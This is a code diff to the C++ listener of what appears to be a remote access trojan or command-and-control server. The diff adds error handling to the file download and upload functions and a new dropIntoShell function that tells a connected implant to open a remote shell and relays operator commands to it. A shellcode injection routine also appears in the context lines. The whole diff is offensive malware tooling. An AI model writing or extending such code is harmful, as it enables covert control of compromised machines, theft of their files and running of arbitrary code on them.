@@ -101,6 +101,14 @@ int listener::downloadFile(string r_path, string l_path) {
 	string cmd = "download:" + r_path;
 	send(new_fd, cmd.c_str(), cmd.length(), 0);
 			
+	char *recv_code = new char[1024];
+	int b = recv(new_fd, recv_code, 1024, 0);
+
+	if (recv_code[0] == '1') {
+		printf("%s", recv_code);
+		return 1;
+	}
+
 	while (out.is_open()) {
 		char *recvbuf = new char[1024];
 		int bytes = recv(new_fd, recvbuf, 1024, 0);
@@ -124,12 +132,19 @@ int listener::downloadFile(string r_path, string l_path) {
 		}
 	}
 	printf("Finished Downloading!\n");
+	return 0;
 }
 
 int listener::uploadFile(string l_path, string r_path) {
 	printf("Uploading File...\n");
 	std::streampos filesize = 0;
 	ifstream in(l_path, std::ios::binary);
+
+	if (!in.is_open()) {
+		printf("Error Opening File");
+		return 1;
+	}
+
 	char* sendbuf = new char[1024];
 	int sendbuflen = 1024;
 	memset(sendbuf, '\0', sendbuflen);
@@ -152,6 +167,7 @@ int listener::uploadFile(string l_path, string r_path) {
 		}
 	}
 	printf("Finished Uploading!\n");
+	return 0;
 }
 
 int listener::injectShellcode(string l_path) {
@@ -180,6 +196,49 @@ int listener::injectShellcode(string l_path) {
 		}
 	}
 	printf("Finished Uploading Shellcode!\n");
+	return 0;
+}
+
+int listener::dropIntoShell() {
+	printf("Dropping into Shell...\n");
+
+	char* sendbuf = new char[2048];
+	char* recvbuf = new char[2048];
+	int buflen = 2048;
+	memset(sendbuf, '\0', buflen);
+	memset(recvbuf, '\0', buflen);
+
+	string cmd = "dropshell:";
+	send(new_fd, cmd.c_str(), cmd.length(), 0);
+
+	printf("Dropped into shell!\n");
+
+	//cmd = "whoami";
+	//send(new_fd, cmd.c_str(), cmd.length(), 0);
+
+	int bytes;
+	int byte_recv;
+	int n;
+
+	do {
+
+		byte_recv = recv(new_fd, recvbuf, buflen, 0);
+		cout << recvbuf;	
+
+		string data = "whoami";
+		//getline(cin, data);
+		//strcpy(sendbuf, data.c_str());
+		n = 0;
+		while ((sendbuf[n++] = getchar()) != '\n');
+		//printf("Sending command\n");
+		bytes = send(new_fd, sendbuf, sizeof(sendbuf), 0);
+		//bytes = send(new_fd, data.c_str(), sizeof(data.c_str()), 0);
+
+		memset(recvbuf, '\0', buflen);
+		memset(sendbuf, '\0', buflen);
+	} while (byte_recv > 0);
+
+	return 0;
 }
 
 string listener::print(){
